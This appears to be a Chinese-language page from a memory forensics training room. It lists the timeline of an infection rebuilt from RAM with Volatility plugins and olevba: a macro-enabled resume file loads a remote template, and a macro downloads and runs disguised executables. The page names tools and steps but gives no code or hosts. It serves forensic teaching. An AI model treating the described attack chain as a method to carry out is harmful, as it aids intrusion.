我们完全基于RAM数据工作，没有依赖磁盘日志。 遵循这些痕迹，我们构建了用户行为和潜在恶意活动的清晰图景。 到目前为止，我们可以构建一个如下所示的时间线。

1. 在内存捕获时，用户操作员已登录并处于活动状态：通过会话数据和加载的注册表配置单元确认。 使用 **windows.sessions** 和 **windows.registry.hivelist** volatility 插件。
2. 恶意文档 **cv-resume-test.docm** 已通过 Microsoft Word 打开：追踪到 **WINWORD.EXE** 进程和文件句柄。 使用 **windows.cmdline** 和 **windows.handles** volatility 插件。
3. 该文档触发了一个包含嵌入宏的链接模板（**.dotm**）：通过检查与 WINWORD.EXE 关联的转储文件对象识别：使用 **windows.dumpfiles** volatility 插件并在进程目录上运行 grep 命令。
4. 宏静默执行，从远程服务器下载并运行 pdfupdater.exe：从内存中提取并分析宏内容。 解压 **.dotm** 并在 **vbaProject.bin** 上运行 **olevba**。
5. 下载的文件生成了 **windows-update.exe**，随后启动了 updater.exe：通过使用 **pslist**、**cmdline** 和进程祖先关系确认进程关系和创建顺序。
6. 通过启动 cmd.exe 和 powershell.exe，利用后活动变得明显：在有效载荷执行后不久，通过 **sessions** 和 **pslist** 在同一会话中观察到活动进程。
7. UserAssist 条目确认启动了如命令提示符等交互式应用程序：使用 **windows.registry.userassist** volatility 插件从操作员的 **NTUSER.DAT** 配置单元中恢复，作为 **GUI驱动** 执行的证据。

在本模块的下一房间中，我们将学习如何类似地跟踪和追溯网络连接。 我们还将完成当前正在构建的时间线，以尝试揭示整个攻击链。

:::info 回答以下问题

<details>

<summary> 点击以完成房间。 </summary>

```plaintext
No answer needed
```

</details>

:::
